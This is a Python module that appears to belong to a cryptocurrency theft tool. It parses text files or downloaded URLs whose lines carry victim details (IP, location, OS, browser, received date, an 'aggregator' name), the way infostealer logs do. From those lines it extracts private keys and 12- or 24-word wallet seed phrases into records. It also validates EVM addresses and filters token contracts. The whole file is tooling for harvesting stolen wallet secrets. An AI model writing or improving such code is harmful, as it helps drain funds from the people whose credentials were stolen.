import sys
import requests
from config import ScammedAddresses, users

def userHash(hash):
    for dic in users:
        if dic['hash'] == hash:
            return dic
    return False

def validateEVMAddress(addr:str):
    s='1234567890abcdef'
    addr = addr.lower()
    if len(addr) == 42 and addr[0:2:]=='0x':
        for i in addr[2:]:
            if not i in s :
                return False
        return True
    return False

#Filters and prioratize the token
def filterTokens(contLL:list, net):
    NewcontLL=[]
    for cont in contLL:
        scamCont = False
        for token in ScammedAddresses[net]:
            if token.lower()==cont['token_address'].lower():
                scamCont = True
        if not scamCont:
            NewcontLL.append(cont)
    NewcontLL.sort(key=lambda x: x['worth'], reverse=False)
    return NewcontLL

def validateTXTURL(s):
    s=s.strip()
    if s[-4:].lower() == '.txt':
        return True
    else:
        return False

alphabets = "abcdefghijklmnopqrstuvwxyz"

def checkWord(word):
    word = word.strip()
    for i in word:
        if not i in alphabets:
            return False
    return True


def findSeed(s, n=12):
    s=s.strip().split(' ')
    l=[]
    if len(s)==n:
        c=0
        for i in s:
            if checkWord(i):
                c+=1
            else:
                break
        if c == n:
            return ' '.join(s)
    for i in range(1,len(s)-(n-2)):
        c=0
        for j in s[i:(i+(n-2)):]:
            # print(s[i:(i+10):])
            if checkWord(j) == False:
                break
            else:
                c+=1
        ans = s[i:(i+(n-2)):]
        if c==(n-2):
            letter = s[i-1][::-1]
            f = ''
            for ll in letter:
                if not ll in alphabets:
                    break
                else:
                    f+=ll
            ans = [f[::-1]]+ans
            letter = s[i+(n-2)]
            f = ''
            for ll in letter:
                if not ll in alphabets:
                    break
                else:
                    f+=ll
            ans = ans+[f]
                            
            return " ".join(ans)
    return l


def processFile(agg_name:str, fileName:str, dataURL:str, seed:str):
    # print(agg_name, fileName, dataURL, dataURL=='n')
    if fileName == 'n' and dataURL != 'n':
        # dataURL = 'https://www.w3.org/TR/PNG/iso_8859-1.txt'
        res = requests.get(dataURL)
        data = res.text
    elif dataURL == 'n' and  fileName != 'n':
        file = open(fileName, 'r')
        data = ''
        for line in file:
            data+=line
        file.close()
    elif dataURL == 'n' and  fileName == 'n' and len(seed) > 0:
        outDict = {
            'mnemonic': '',
            'key':'',
            'aggregator_name': agg_name,
            'ip':'',
            'geo':'',
            'received_date':'',
            'os':'',
            'type':'',
            'browser':'',
        }
        seed = seed.strip()
        if len(seed.split(' ')) > 1:
            outDict['mnemonic'] = seed
        else:
            outDict['key'] = seed
        return [outDict]    
    else:
        print('No Data provided')
        return False
    ansList = []
    lineData = data.split("\n")
    # for line in lineData:
    #     if line.strip()[0:2:]=='==' or line.strip()=='':
    #         lineData.pop(line)
    for line in lineData:
        line = line.lower()
        outDict = {
            'mnemonic': '',
            'key':'',
            'aggregator_name': agg_name,
            'ip':'',
            'geo':'',
            'received_date':'',
            'os':'',
            'type':'',
            'browser':'',
        }
        if ':' in line:    
            if '|' in line:            
                lineList = line.split('|')
            else:
                lineList = line.split(',')
            try:
                for pairL in lineList:
                    if ':' in line:
                        pair=pairL.split(':')
                    else:
                        break
                    pair = [i.strip() for i in pair]
                    
                    if 'key' in pair[0]:
                        if pair[1] != '' :    
                            outDict['key'] = pair[1]
                    elif 'ip' in pair[0]:
                        outDict['ip'] = pair[1]
                    elif 'type' in pair[0]:
                        outDict['type'] = pair[1]
                    elif 'location' in pair[0]:
                        outDict['geo'] = pair[1]
                    elif 'os' in pair[0]:
                        outDict['os'] = pair[1]
                    elif 'browser' in pair[0]:
                        outDict['browser'] = pair[1]                    
                    elif 'received' in pair[0]:
                        outDict['received_date'] = pair[1]
            except:        
                print(str(sys.exc_info()[1]))
                                         
        seed24 =  findSeed(line, 24)
        seed12 =  findSeed(line, 12)
        
        if len(seed24) > 0:
            outDict['mnemonic'] = seed24
                # print(outDict)

        elif len(seed12) > 0:
            outDict['mnemonic'] = seed12            
                # print(outDict)
        if len(outDict['key']) > 0 or len(outDict['mnemonic']) > 0:
            ansList.append(outDict)                                                
    if len(ansList)==0:
        print('No seed found')
        return False
    return ansList                